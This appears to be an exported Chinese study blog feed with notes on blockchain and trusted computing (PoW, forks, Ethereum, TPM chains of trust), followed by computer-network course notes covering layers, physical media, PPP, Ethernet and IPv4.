3.不可篡改，且能防伪造，数量一定。4.隐私安全</p><ul><li><p><strong>数字签名</strong>：交易时使用，自己生成一对密钥=私钥+公钥；通过私钥对消息进行签名（加密）上传，其他人可以通过公钥对该签名进行验证，防伪造（私钥只有自己知道）、防篡改（原始消息被改后，对签名的验证将失败）、防抵赖（签名正确验证前提下，发出人不能说自己没有发布该条信息）。常用的算法有：RSA、DSA、ECDSA（比特币采用）算法</p></li><li><p><strong>去中心化/账本管理协会/分布式账本</strong>：部分机器可以参与进来作为记账先生，由于贡献了算力，所以可以有一定的奖励（有条件），这种获得奖励的方法叫“工作量证明”机制。理论上来说，如果能够有全网51%算力，就可以更改该账本的内容，简称算力攻击。由账本管理协会通过广播向全网传递已经（hash处理加密过的）算好的大账本，同时由于hash的不同x不同y的性质，可以按照此hash进行对照</p></li><li><p><strong>双花</strong>：同一个人的同一样东西与不同的人交易，导致账本会出现两条链，为解决该问题，比特币系统选定最长链为可信任的账本；要想伪造假链就需要记账的人中一半以上都来伪造该假链，即算力的51%。</p></li><li><p><strong>分叉</strong>：通常由不同矿工使用不同版本的比特币系统挖矿导致分叉；分为硬分叉和软分叉；比特币系统扩容/更新，即区块的容量增大，使得记账效率提高，新矿工（大区块）包容旧矿工（小区快），由于存在旧矿工同样进行记账，于是产生硬分叉（无法合并），更新的链条叫比特币现金，未扩容的链条叫比特币现金；篡改数据结果即是软分叉，可合并，由系统操作。</p></li><li><p><strong>PoW</strong>（工作量证明机制）： 区块数据与Nonce进行hash函数运算得到的结果&lt;系统给出的目标hash值，则获得记账权（有奖励），如果&gt;=，那么Nonce++，直到算出合适的Nonce（即计算次数/挖矿次数），这样才获得奖励</p></li><li><p><strong>挖矿</strong>：利用GPU做hash函数（条件），许多机器同时做，又快又准的计算出结果的获得记账权（工作量证明机制—POW），将交易信息写入新的区块然后广播，获得奖励，贡献算力当记账先生，这样的机器叫做矿工；由于不容易，所以就有矿池（多亿个矿工）出现，矿池拿到奖励后按照算力将奖励分配给下属矿工</p><blockquote><p>不用CPU是因为，CPU对这样无意义的hash函数试错功能并不如GPU高，即算力（计算hash的速率—-哈希率）相比于GPU低</p></blockquote></li><li><p><strong>DeFi</strong>：去中心化金融。基于上述区块链技术发展出来的金融体系，具有传统金融的各种功能，但是没有了集中管理结构。具有：透明、匿名、任意时间、周转快等特点。</p></li><li><p><strong>虚拟钱包</strong>：用于管理资产，就算换个钱包，地址什么的都知道，仍然能用该笔钱。公钥=地址—你的银行卡账号（别人可以仅通过地址就向你转钱）；私钥=助记词—银行卡+密码（由于私钥难记，就换成了单词组成的助记词）；Keystore：加密过的私钥，加密需要用到自定义的密码</p></li></ul><h4 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h4><p>相较于比特币来说，以太坊并不仅仅只是一种虚拟货币，它是一个巨大的去中心化的、分布式的平台，世界各地的计算机通过安装特定软件，来加入到这个巨大的网络中。目的是为了创造一个无法停止、抗屏蔽、自我维持的去中心化计算机世界，其中可以运行灰常多个程序。</p><ul><li><strong>EVM</strong>：以太坊虚拟机，区别于传统的JVM虚拟机，EVM虚拟机中的内容由许多正在运行相同以太坊客户端共同计算维护（不同软件不同平台，这里仅仅拿以太坊作为例子），类似于云。用于处理智能合约，还是将代码—操作码（汇编）—01字节码</li><li><strong>DAPP</strong>：部署在上述平台上的应用程序就叫做DAPP（去中心化的APP）；这里包括应用使用的前端与后端。由于上传到链中，所以DAPP在部署之后非常难以维护、更新；适合于不受主观因素影响的业务，不适合经常改变规则的业务</li><li><strong>智能合约</strong>：DAPP的后端（在EVM上），和现实中的合约类似，但是会有强制执行的特性，当条件满足时，预定好的行为会自动执行。就像自动售货机一样，用户输入所选物品并付钱，之后售货机自动弹出目标。目前链上的大多数攻击都针对的是智能合约的漏洞，就比如交易依赖攻击：攻击者没有根据合约规定顺序进行交易，导致不同输出，从而间接操作合约。</li><li><strong>Gas</strong>：由于由于每笔以太坊交易都需要计算资源才能执行，每笔交易都需要付费。 燃料是指在以太坊上执行交易所需的费用，不论交易成功与否，此外他还一定程度上防止了恶意应用的出现。不同币不同油费与单位</li><li><strong>PoS</strong>（权益证明机制）：在每个区块挖取时，选择下注（以太币），保证金出的多，胜出可能性高，但是该保证金会被冻结一段时间。</li><li><strong>以太币</strong>（ETH）：以太币作为以太坊的原生货币，具有一些独特的功能，就像上面的Gas。除此之外在以太坊中还有一些其他的代币，可以由任何人创建，就比如代表以太坊上物品所有权的代币NFT</li><li><strong>DAO</strong>（去中心化自治组织）：加入该组织就相当于加入了董事会，只是没有了董事长什么的高低之分，完全平等。董事会内部具有智能合约限制，需要投票表决通过某些决策，只要票数超过规定，决策自动执行。不同的自治组织加入方法不同：投代币就可以参加投票、设定信誉积分等等</li><li><strong>Ghost</strong>：一种协议，旨在减少分叉；每个区块最多两笔招安合并奖励（$\frac{7}{8}$ 出块奖励，往后再一个块则降为$\frac{3}{4}$出块奖励），越早合并奖励越高（&lt;1x出块奖励）</li><li><strong>NFT</strong>：非同质化代币；独一无二的“数字藏品”，不可能有第二份相同的；一般与发行方自己的币绑定，通过发放这种独一无二的藏品，来让客户支持本项目的开发。</li></ul><h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h3><p>重要概念理解</p><ul><li>可信：一个实体的行为总是以预期的方式，朝着预期的目标，那么认为他是可信的</li><li>可信计算：计算运算的同时进行安全防护，计算全程可测可控，不被干扰，只有这样方能使计算结果总是与预期一样</li></ul><p>基本思想：在计算机中，首先创建一个安全信任根，再建立从硬件平台、OS到应用系统的信任链，在这条信任链上从根开始一级测量/信任一级，依次扩展。</p><blockquote><p>信任链：A-&gt;B-&gt;C-&gt;D；直接信任：A-&gt;B；间接信任：A-&gt;C&amp;C-&gt;B=A-&gt;B</p></blockquote><ul><li>1.0时代：通过纯软件实现的容错、故障诊断等机制</li><li>2.0时代：增加硬件实现的信任根TPM，构建信任链</li><li>3.0时代：“宿主+可信”双节点主动免疫可信计算架构</li></ul><p>重要内容：</p><ul><li><p>信任链：RTM将完整性度量形成的信息传递给RTS，之后由RTS使用TPM平台的寄存器PCR存放度量扩展值，并使用TPM的密码学服务保护度量日志。</p><p>RTR主要用于远程证明，向实体提供平台可信状态信息，主要包括平台配置信息、审计日志、身份密钥等。</p><ol><li>可信度量根RTM：即信任根，一般定义在扩展BIOS上，负责完整性度量，对外不暴露任何接口，理论上不可被篡改，因此可以无条件可信</li><li>可信报告根RTR：负责报告信任根。由TPM平台的配置寄存器PCR和背书密钥EK组成</li><li>可信存储根RTS：负责存储信任根。由TPM的PCR和存储根密钥SRK组成</li></ol></li><li><p>可信平台模块TPM：可信计算平台依赖的核心，负责可信计算平台的安全控制和运算功能，以及存储基线和可信报告。（国产类似的有TCM和TPCM）。</p><p>其中的支撑软件(栈)叫做TSS，主要用于为OS和应用提供使用TPM的接口。</p><blockquote><p>基线：指判断依据，静态度量下可以是操作系统、配置文件、代码、数据；动态度量下可以是流量、进程、行为等。通过监控上述行为来产生可信报告最后判定是否可信</p></blockquote></li><li><p>度量：一个实体对另一个实体的可信评估；完整性度量即计算Hash值，之后与RTS中的校验值基准对比</p></li><li><p>静态信任链：系统启动时建立，信任链从RTM-&gt;BIOS-&gt;Bootloader-&gt;OS-&gt;应用</p></li><li><p>TNC可信网络连接：依据上面的RTR实现网络中的一级级验证，确保接入可信</p></li></ul><p>在可信计算3.0中将RTM也置于了TPCM中，并先于CPU启动。</p><ul><li>可信软件基TSB：植入到操作系统内核，在TPCM支撑下实现对宿主系统中软件资源的度量和控制。先启动操作系统最小核之后TSB</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网</title>
      <link href="/2023/10/06/%E8%AE%A1%E7%BD%91/"/>
      <url>/2023/10/06/%E8%AE%A1%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="计网第一章：概述"><a href="#计网第一章：概述" class="headerlink" title="计网第一章：概述"></a>计网第一章：概述</h2><h3 id="计网发展阶段"><a href="#计网发展阶段" class="headerlink" title="计网发展阶段"></a>计网发展阶段</h3><ol><li><p>面向终端的计算机网络</p><p>特点：系统中仅主计算机有计算能力，终端无独立处理数据的能力。</p><blockquote><p>线路控制器：串并转换+传输差错控制；调制/解调器：用于数字和模拟信号的转换</p></blockquote><p>为降低通信成本：主机前增设前端处理机，终端密集地放置集中器，用以解决终端独占线路与助记负载过重的问题</p></li><li><p>计算机通信网络or分组交换网络or面向标准的计算机网络</p><p>特点：可用于数据传输、终端类型广、节点同等重要、冗余路由、简单但又相对可靠</p><p>先后提出<strong>存储转发技术</strong>与<strong>分组交换技术</strong>（后者相对于前者每一次转发的不是整个文件而是切割后的小包）</p></li><li><p>共享资源的计算机网络</p><p>特点：共享数据为主、每个网络内部使用各自的协议、网络之间用TCP/IP协议簇</p><p>三个阶段：</p><ol><li>由单个网络ARPANET发展而来，1983年以TCP/IP协议簇为标准也因此作为互联网诞生时间，1990年关闭</li><li>三级结构互联网，包括主干网—地区网—校园网/企业网三级</li><li>多层次ISP（互联网服务提供者）结构的互联网，由Alice-本地ISP-地区ISP-主干ISP-…-本地ISP-Bob</li></ol></li><li><p>Internet高速发展</p><ul><li><p>SDN软件定义网络</p></li><li><p>云计算：分布式、并行计算、虚拟化</p></li><li><p>物联网IoT，借助云实现普适计算</p></li></ul></li></ol><h3 id="计算机网络概念"><a href="#计算机网络概念" class="headerlink" title="计算机网络概念"></a>计算机网络概念</h3><p>最简定义：计算机网络是一些互相连接的、自治的计算机系统的集合。其中最大的计算机网络就是Internet——也叫做网络的网络（Network of Network）</p><h3 id="计算机网络组成"><a href="#计算机网络组成" class="headerlink" title="计算机网络组成"></a>计算机网络组成</h3><p><strong>物理组成</strong>：</p><ul><li><p>硬件：主机host、通信处理控制机CCP、路由器Router、交换机Switch、通信链路。</p><blockquote><p>物理媒介/物理链路：双绞铜线、同轴电缆、光纤、陆地无线通信、卫星无线通信</p></blockquote></li><li><p>软件：共享的资源的软件、工具软件</p></li><li><p>协议：通信协议、数据交换协议</p></li></ul><p><strong>要素组成</strong>：计算机、路由器、交换机、网卡、通信线路、调制解调器</p><p><strong>功能组成</strong>：资源子网（数据的处理存储）、通信子网（数据的传输）</p><h3 id="互联网组成"><a href="#互联网组成" class="headerlink" title="互联网组成"></a>互联网组成</h3><ul><li><p>直接连接的：点到点链路、经集线器HUB（盒装总线）、多路访问链路</p></li><li><p>网络云：端系统经交换网互联；网络云互联构成互联网，必定有路由器</p><blockquote><p>核心部分=网路+路由器（关键！网网互联）；<br>边缘部分=主机+终端；端系统之间的通讯方式：C/S方式、P2P方式</p></blockquote></li></ul><h3 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h3><ul><li><p>电路交换：$N$部电话机需要$N(N-1)/2$对电线，当然也可以使用交换机。</p><p>必定是面向连接的、线路利用率低</p><p>包括三个阶段：建立专用连接——双方通信——释放连接</p></li></ul><ul><li>报文交换：在分组交换之前，基于存储转发，不分组而已。</li><li><p>分组交换：同样基于存储转发技术，但是长切短分组进行。</p><ul><li>分组=首部+数据，首部含有源/目的地址，节点交换机据此转发报文；有额外开销</li><li>每个分组独立选择路径</li><li>路由器处理：放入缓存——查找转发表——送走；需要排队有时延</li></ul></li></ul><h3 id="计算机网络分类"><a href="#计算机网络分类" class="headerlink" title="计算机网络分类"></a>计算机网络分类</h3><ul><li><p>分布范围：广域网WAN（交换技术）、城域网MAN、局域网LAN（广播技术）、个人区域网PAN</p></li><li><p>使用者：公用网、私用网或是骨干网、接入网、驻地网</p></li><li><p>拓扑结构：总线型、星型、环型、树型、网格型</p></li><li><p>数据交换技术：电路交换、报文交换、分组交换、信元交换、广播技术网络</p><blockquote><p>信元交换，又叫异步传输模式（ATM），一种使用异步时分复用技术的面向分组的传输方式，它将信息流分割成53字节的ATM信元=5B信头+48净荷</p></blockquote></li><li><p>按协议：IP网络、IPX网络（非IP网络）</p></li><li><p>传输介质：有线、无线</p></li><li><p>共享资源：C/S、P2P</p></li></ul><h3 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h3><p><strong>网络协议</strong>：为进行网络中数据交换而事先约定好的规则。它定义了在两个或多个通信实体之间交换的报文格式和次序，以及在报文传输和接受其他事件方面所采取的动作。只确定外部特点内部具体实现不做规定</p><ul><li><p>构成：语法（结构格式）、语义（操作定义）、同步（事件实现顺序）</p></li><li><p>再同一协议下，两个对等实体之间的通信又可以叫做虚拟通信/逻辑通信（没有直接联系），其基于下层所提供的服务实现</p></li><li><p>协议是水平的，服务是垂直的；</p></li><li><p>不同系统中对等实体间交换数据的单位叫第N层的<strong>协议数据单元（N）PDU</strong>。包含用户数据（也可以是SDU）&amp;该层的<strong>协议控制信息PCI</strong>；</p><p>同一系统相邻两层实体间经过接口交换的数据单位叫<strong>接口数据单元IDU</strong>，包括PDU和<strong>接口控制信息ICI</strong></p></li></ul><p><strong>网络体系结构</strong>：计算机网络各层及其协议的集合</p><ul><li><p>分层体系结构：目标机第n层接收源主机第n层数据</p></li><li><p>服务：每一层，向上提供服务，以下层的服务为基础而无需考虑</p></li><li><p>实体：发送接收信息的任何对象，可以是终端、进程等。</p><p>不同系统同一层的双方叫对等实体；一般叫下层实体为服务提供者，上层为服务用户</p></li><li><p>接口：<strong>服务访问点SAP</strong>，即第N层实体与第N+1层实体交换数据的地方=N层SAP，地址唯一，期间交换信息单位叫<strong>服务数据单元SDU</strong></p></li></ul><p><strong>典型体系结构</strong>：</p><ul><li><p>OSI七层：7应用层，6表示层（翻译应用层），5会话层（管理上层），4传输层，3网络层，2数据链路层，1物理层</p><blockquote><p>数据单元从上到下：APDU、PPDU、SPDU、TPDU、分组、帧、比特流；路由器最高下三层，交换机低两层</p></blockquote></li><li><p>TCP/IP四层：应用层—运输层—网际层IP—网络接口层</p></li><li><p>经典五层：5应用层，4运输层，3网络层（包，报），2数据链路层（网卡、网桥，帧），1物理层（线，比特）</p></li></ul><p><strong>各层主要功能</strong>：</p><ul><li>差错控制、流量控制、分段和重装</li><li>复用和分用：发送端几个高层会话复用一条低层的连接，在接收端进行分用</li><li>连接建立和释放：交换前先建立逻辑连接，结束后再释放该连接</li></ul><h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><ul><li><p>速率：数据传输速率，又叫数据率或比特率，常用bit/s、kbit/s等，按照1k=1000计算</p></li><li><p>带宽：单位时间内能通过的最大数据量，单位bit/s，即最大速率</p></li><li><p>吞吐率：单位与前面相同，带宽是最大的速率，吞吐率是实际</p></li><li><p>时延：总时延=以下四者的和（注意！高速链路指的是提高发送速率，传播速率由介质决定）</p><ul><li>发送时延：$\frac{数据帧长度bit}{发送速率bit/s}$，数据帧从发送端到传输媒介的时间</li><li>传播时延：$\frac{信道长m}{信道传播速率m/s}$，信号在传输媒介中跑的时间</li><li>处理时延：主机或处理器处理分组所花费的时间</li><li>排队时延：在路由器的输入输出队列中排队等待处理的时间</li></ul></li><li><p>时延带宽积：又叫做“以比特为单位的链路长度”，=传播时延×带宽</p></li><li><p>往返时间RTT：”发送方”发送数据开始到接收到”接收方”的确认</p></li><li><p>利用率：包括信道利用率（某信道有多少时间被用），网络利用率（全网络的信道利用率的加权平均值）</p><blockquote><p>$D=\frac{D_{0} }{1-U}$：$D_{0}$网络空闲时的时延，$D$表示当前时延，$U$为网络利用率</p></blockquote></li></ul><h2 id="计网第二章：物理层"><a href="#计网第二章：物理层" class="headerlink" title="计网第二章：物理层"></a>计网第二章：物理层</h2><h3 id="数据通信基本知识"><a href="#数据通信基本知识" class="headerlink" title="数据通信基本知识"></a>数据通信基本知识</h3><p>数据通信系统：源系统=原点+发送器——传输系统——目的系统=接收器+终点</p><blockquote><p>目的是传送消息，数据是运送消息的实体，信号则是数据的电器表现</p></blockquote><div class="table-container"><table><thead><tr><th>概念</th><th>解释</th></tr></thead><tbody><tr><td>码元</td><td>即一个固定时长的数字信号波形，其宽度为时间</td></tr><tr><td>频谱</td><td>信号中各频率成分的集合</td></tr><tr><td>带宽</td><td>信号带宽即信号占据的频率范围；信道带宽就是允许通过的信号频率范围</td></tr><tr><td>域</td><td>时域：信号与时间的函数；频域：信号与频率的函数</td></tr><tr><td>数字</td><td>数字数据:在某区间残生离散值的数据；数字信号:离散变化的序列；数字传输:传输数字信号的方法（可以是调制后为数字信号）；中继方式增大传输距离</td></tr><tr><td>模拟</td><td>某区间产生连续的数据；连续变化的电磁波；传输模拟信号的方法；放大方式增加距离</td></tr><tr><td>信道</td><td>能传送信号的一条道路，由线路及附属设备构成</td></tr></tbody></table></div><p>通信交互模式：</p><ul><li>单向通信/单工通信：只能A到B</li><li>双向交替通信/半双工通信：同一时间只能一个方向，换方向时换线</li><li>双向同时通信/全双工：四线制</li></ul><p>基带信号（信号源的信号，需要进行调制）调制方法：</p><ul><li><p>基带调制/编码：仅进行波形变换—得到的仍是基带信号</p></li><li><p>带通调制：即使用载波将其频率提高并转换为模拟信号—带通调制后得到带通信号</p><blockquote><p>带通调制方法：调幅AM、调频FM、调相PM——正交振幅调制QAM</p></blockquote></li></ul><p>常用信道编码：</p><ul><li>不归零制：正电平=1，负电平=0，不用0电压</li><li>归零制：无事归0，正电平=1，负电平=0</li><li>曼彻斯特编码：周期中心，高到低=1，低到高=0</li><li>差分曼彻斯特编码：位开始处，有跳变=0，无跳变=1</li></ul><p>信道相关概念：</p><ul><li><p>信道容量：无差错传输的最大速率，是信道的最大数据率</p></li><li><p>抖动：有效瞬时相对于理想位置的偏移</p></li><li>误码率：二进制位传错的概率</li><li>信噪比：信号的平均功率S和噪声的平均功率N之比=$10\times \log_{10}(S/N)(dB)$</li><li>奈氏准则：在带宽为W Hz的低通信道中，若不考虑噪声，假定每个信号取M个离散电平均值，则码元传输最高速率2W（码元/秒），信道极限数据率为$C=2W\log_{2}{M}$，否则接收端不可能识别码元</li><li>香农公式：信道的极限信息传输速率：$C=W\log_{2}(1+S/N)(bps)$，相比奈奎斯特，考虑了噪音。</li><li>延迟失真：较高频率传输速度的较低</li><li>噪声：热噪声、脉冲噪声（持续短、不规则、振幅高）、串扰（电气耦合）</li><li>调制解调器：大于9600b/s为高速，小于600b/s为低速</li></ul><p>传输损害：</p><ul><li>衰减/幅度衰变：衰减量是距离的函数，对模拟信号来说频率越高，衰减越严重</li><li>延迟失真：有线专有，针对数字信号不同频率信号走的快慢不同</li><li>热/白/高斯噪声：温度变化结果</li><li>串扰：两条线路间的电气耦合</li><li>脉冲噪声：由持续时间短和幅度大的不规则脉冲或草绳尖峰组成</li></ul><p>同步方式：数据从发送端到接收端的步调一致</p><ul><li>异步：每次传送一个字符，前+起始位编码0，后+停止位编码1</li><li>同步：比特块以固定的位流形式，前后需要有一组比特信息来标志该信息块</li></ul><h3 id="物理层下的传输媒体"><a href="#物理层下的传输媒体" class="headerlink" title="物理层下的传输媒体"></a>物理层下的传输媒体</h3><p><strong>双绞线/双扭线</strong>：</p><p>包含屏蔽双绞线STP、非屏蔽双绞线UTP。</p><ul><li><p>非屏蔽双绞线：四对纽线：白-橙+橙；白-绿+绿；白-蓝+蓝；白-棕+棕；连接配件RJ-45接头</p></li><li><p>连接配件的两种连接标准：EIA/TIA 568A和B（直通方式-标准相同-主机与交换机相连；交叉方式-不同-两主机与交换机直连）</p></li></ul><p><strong>同轴电缆</strong>：已被双绞线替代</p><ul><li><p>50Ω即细缆，采用BNC接口</p></li><li><p>75Ω同轴电缆即粗缆，采用AUI接口</p></li><li><p>结构：内导体铜质芯线—绝缘层—外导体屏蔽层—绝缘保护层</p></li></ul><p><strong>光缆</strong>：包括光源+光纤+光检测器；任何时候只能单向传输；</p><ul><li><p>多模光缆：多条不同角度入射的光线在一条光纤中传输，距离2km</p></li><li><p>单模光缆：直线传输，直线传输，距离10km</p></li><li><p>光纤由玻璃塑料制成，传输速度依赖于介质密度，密度越大速度越高，真空中300000Km/s</p></li><li>光纤包括多模与单模光纤，前者是用发光二极管LEG产生光源，后者使用半导体激光器产生光源</li></ul><p><strong>非引导型传输媒体</strong>：微波、无线电、红外线</p><ul><li>无线电微波通信，主要使用2-40GHz，主要直线传播</li><li>多径效应：基站信号经过多个障碍物反射同时到达接收方，叠加后有很大失真</li><li>微波接力：中继站放大信号后再发送；频率高，信道容量大，但相邻站间必须直视</li><li>卫星通信：通信距离远，稳定，但传播时延大</li></ul><h3 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h3><p>复用：用户使用一个共享信道进行通信，降低成本（因为介质传输能力超过单一信号带宽）</p><ul><li><p>频分FDM：所有用户同样时间不同带宽，即大水管切为小水管</p></li><li><p>时分TDM：不同时间占同样的频带宽度；适合数字信号；切为每段等长的时分复用帧即TDM帧，也叫做等时信息；在各个设备间轮转的过程叫做“交织”</p><p>异步/统计时分多路复用：不分配固定时间片，比较灵活</p><blockquote><p>30路PCM-E1标准：32个时间片，0号用做同步，16号传递信令<br>24路PCM-T1：193bit，分为24路8bit时间片+1个附加同步bit</p></blockquote></li><li><p>波分WDM：光的频分复用</p></li><li><p>码分CDM：码分多址CDMA，各用户使用经过挑选的不同码型</p></li></ul><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><ul><li>目的：屏蔽掉物理设备和传输介质不同带来的差异</li><li><p>特性：是DTE（数据终端设备）和DCE（数据端接设备）之间的一组约定，需要规定接口标准</p></li><li><p>接口标准的四个特性：机械（接口外观）、电气（电压范围）、功能（物理接口上各条信号线各电平的功能分配和定义）、规程（具体步骤）</p></li><li><p>标准：EIA RS-232-E、EIA RS-449、X.21</p></li></ul><h2 id="计网第三章：数据链路层"><a href="#计网第三章：数据链路层" class="headerlink" title="计网第三章：数据链路层"></a>计网第三章：数据链路层</h2><h3 id="使用点对点信道的数据链路层"><a href="#使用点对点信道的数据链路层" class="headerlink" title="使用点对点信道的数据链路层"></a>使用点对点信道的数据链路层</h3><p>一些概念：</p><p>链路（物理链路）：一条无源的点到点物理线路段，中间没有交换节点！，是一条通路的组成部。数据链路（逻辑链路）：在链路基础上，有通信协议来控制数据传输。数据链路层作用：负责相邻节点间<strong>可靠</strong>的数据传输，目前常用适配器/网卡实现软硬件（物理层和数据链路层）</p><blockquote><p>两点间不可靠传输：同步传输问题、噪声干扰、接发速度不匹配。网卡=通信适配器=网络接口卡NIC的功能有：串/并行转换、数据缓存、实现以太网协议、在计算机中安装设备驱动</p></blockquote><p>三个基本问题：封装成帧、透明传输、差错控制</p><ul><li><p>封装成帧-将比特流分成离散帧，并计算校验和：字符计数法（1个字符的开始标记+信息长度+信息）、带字符填充的首位界符法（ASCII中的SOH和EOT表示帧的开始结束）、带位填充的首尾标记法</p></li><li><p>透明传输-正确区分数据和控制信息（避免信息中的SOH被当作控制信息）：字节填充（信息中的SOH前插入转义字符“ESC”）、字符填充</p></li><li><p>差错检测-实现无比特差错的传输：<a href="https://zhuanlan.zhihu.com/p/396165368">循环冗余检验CRC/多项式码</a>（一种冗余码计算方式）；帧检验序列FCS（单指添加在帧后面的冗余码）</p><blockquote><p>无传输差错还包括确认和重传机制</p></blockquote></li></ul><h3 id="点对点协议PPP"><a href="#点对点协议PPP" class="headerlink" title="点对点协议PPP"></a>点对点协议PPP</h3><ul><li><p>特点：简单、封装成帧、透明性、差错检测、支持多种网络层协议、支持多种类型链路、检测连接状态、最大传输单元MTU、网络层地址协商、数据压缩协商</p><blockquote><p>对照数据链路层的可靠传输协议HDLC，缺少纠错、流量控制、序号、多点线路、半双工或单工链路</p></blockquote></li><li><p>组成：将IP数据报封装到穿行链路的方法、链路控制协议LCP、网络控制协议NCP</p></li><li><p>帧格式：如下图所示</p><p><img src="https://img1.imgtp.com/2023/10/24/TKV7nmLT.png" alt="image-20231024194950975"></p></li><li><p>透明传输：</p><ul><li>字节填充法-异步传输：0x7E转为0x7D,0x5E、将0x7D转为0x7D,0x5D、对ASCII小于0x20的控制字符前加0x7D并自身加0x20</li><li>同步-零比特填充：5个连续的1后面就添0</li></ul></li><li><p>工作过程如下：</p><p><img src="https://img1.imgtp.com/2023/10/24/pjPjJ7km.png" alt="image-20231024195634836"></p></li></ul><h3 id="使用广播信道的数据链路层"><a href="#使用广播信道的数据链路层" class="headerlink" title="使用广播信道的数据链路层"></a>使用广播信道的数据链路层</h3><p>局域网优点：具有广播功能、便于扩展、范围站点有限</p><p>局域网拓扑：星形网（集线器）、环形（干线耦合器）、总线型（匹配电阻）</p><p>解决共享冲突问题：</p><ul><li><p>传统共享介质：局域网中任何一段物理信道在一个时间段内只能被一个站点占用 </p></li><li><p>媒体接入控制方法/介质访问控制方法—与拓扑结构密切相关：静态划分信道（频分、时分、波分、码分），动态媒体接入控制（随机接入、受控接入）</p></li></ul><p>以太网标准/802.3局域网：IEEE 802.3、DIX Ethernet V2（TCP/IP体系常用）</p><p>局域网的数据链路层拆为两个子层：逻辑链路控制LLC子层（与传输介质无关，看不见下面的局域网，现在没啥卵用），媒体接入控制MAC子层</p><blockquote><p>CSMA/CD访问法和Token Passing Bus访问法用于总线型、星型网络；Toekn Passing Ring用于环形网络</p></blockquote><p>标准以太网（10Base-5即10Mbps，50Ω同轴线长最大500m）采用总线型的拓扑结构，无连接-不可靠交付-曼彻斯特编码；其实现一对一通信的策略：数据帧中的目的地址与接收站地址一致时才能接受；</p><p>以太网核心技术：<strong>带碰撞检测的载波侦听多点接入</strong>=CSMA/CD（随机争用型的分布式介质访问控制方法-只能半双工-）；先听后发，边发边听，碰撞停发，退避重发。</p><ul><li><p>多点接入：计算机以许多点接入一根总线上</p></li><li><p>载波侦听：总线上是否有其他计算机在发送数据，有则暂停</p></li><li><p>碰撞检测：计算机边发数据边检测信道上的信号电压大小，碰撞时电压摆动会增大，有阈值；记二倍单程传播时延后则碰撞</p></li><li><p>退避重发：二进制指数类型退避算法，碰撞后要等一个随机时间再发</p></li></ul><p>目前的（10BASE-T）以太网=星型拓扑+集线器（物理层）+双绞线+RJ45插头+不到100m</p><p>标准以太网帧格式即MAC帧=6B目的地址+6B源地址+2B类型+46-1500B数据+4BFCS</p><blockquote><p>地址中高24位=OUI组织唯一标识符；低24位扩展唯一标识符EUI。MAC地址也叫做物理地址/硬件地址，适配器标识符EUI-48。类型用于标记上一层的协议类型。无效就丢</p></blockquote><ul><li>扩展以太网：常于数据链路层实现，早期使用网桥，目前多用交换机，用于隔离碰撞域，路由器隔离广播域。帧格式不变。</li></ul><blockquote><p>交换机：接口有存储器、即插即用（帧交换表-自学习算法建立）、专用的交换结构芯片。其交换方式有存储转发、直通方式（区别就是是否检查并缓存）。这里多指数据链路层的交换机，帧交换表=MAC地址+端口+类型，三层的参考ARP</p></blockquote><p>存在的回路问题：在IEEE 802.1D中制定了生成树协议STP，在逻辑上切断形成无环路的树状结构</p><ul><li><p>VLAN虚拟局域网：是由一些局域网网段构成的与位置无关的逻辑组，每一个VLAN的帧都有一个明确标示符，指明发送该帧的计算机属于哪个VLAN（VLAN只是一种服务-按照有关需求对资源等重新组合，而不是一种新型局域网）</p><p>划分虚拟局域网：交换机端口（用户不能动）、MAC地址（MAC地址变了之后需要管理员重新配置）、协议（依据上一层协议划）、IP子网（IP地址划分）、高层服务（FTP一个SMTP一个）</p><blockquote><p>虚拟局域网的以太网帧（802.1Q帧）=在标准MAC帧的源地址和类型中穿插4B标记位</p></blockquote></li><li><p>高速以太网：100Mbps的以太网，叫100BASE-T/快速以太网，IEEE 802.3u。全双工下无冲突发生，MAC帧格式不变，一个网段最大电缆长度减到100m，帧的时间间隔0.96μs</p><p>吉比特以太网：1Gbps下可以全双工（不使用下面技术）和半双工（有冲突）。载波延伸：加上载波延伸后MAC帧共512B，之后再发送；分组突发：第一帧需要载波延伸，后面的帧间有最小间隔即可</p></li></ul><h2 id="计网第四章：网络层"><a href="#计网第四章：网络层" class="headerlink" title="计网第四章：网络层"></a>计网第四章：网络层</h2><h3 id="网络-网际层"><a href="#网络-网际层" class="headerlink" title="网络/网际层"></a>网络/网际层</h3><p><strong>网络层提供的两种服务</strong>：</p><ol><li>面向连接的可靠交付，之前先建立虚电路VC来保证双方通信所需的一切网络资源。分组沿着同一路径传送</li></ol><blockquote><p>虚电路：一条物理链路上通过缓冲区区分多个虚拟电路，因此每个节点需要有虚电路的入口出口表，每个口对应一个VC号</p></blockquote><ol><li>无连接的，尽力交付的数据服务，每一个分组独立发送，路径可以不同，让运输层负责可靠传输。</li></ol><p>路由器之间传播的信息有数据、路由信息，也因此有网络层的两个层面，数据层面和控制层面（可单独抽出来作为SDN）</p><blockquote><p>SDN—软件定义网络：由远程控制器计算出最佳路由之后在每一个路由器中生成正确的转发表，此时的路由器仅需查找转发表并转发分组即可</p></blockquote><p>中间设备：</p><ul><li>运输层及以上：网关</li><li>网络层：路由器</li><li>数据链路层：网桥或桥接器，交换机</li><li>物理层：转发器</li></ul><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p><strong>IPv4配套的协议</strong>：地址解析协议ARP、网际报文控制协议ICMP、网际组管理协议IGMP</p><p><strong>表示法</strong>：32位二进制代码，4<em>8，<em>*点分十进制法</em></em>。每个IP地址由ICANN互联网名字和数字分配机构（域名IP分配）</p><p><strong>IPv4发展阶段</strong>：</p><ol><li>分类IP地址—2级结构：【网络名+主机名】</li></ol><div 